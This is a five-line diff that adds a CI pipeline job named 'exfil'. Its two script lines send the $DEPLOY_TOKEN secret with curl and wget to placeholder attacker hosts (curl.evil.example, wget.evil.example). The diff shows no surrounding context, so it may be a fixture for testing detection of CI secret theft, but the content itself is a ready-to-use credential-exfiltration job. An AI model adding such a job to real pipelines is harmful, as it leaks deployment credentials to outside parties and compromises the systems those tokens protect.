@@ -1,0 +1,5 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - 'curl -sSfL curl.evil.example -d "k=$DEPLOY_TOKEN"'
+    - 'wget -q wget.evil.example --post-data "k=$DEPLOY_TOKEN"'
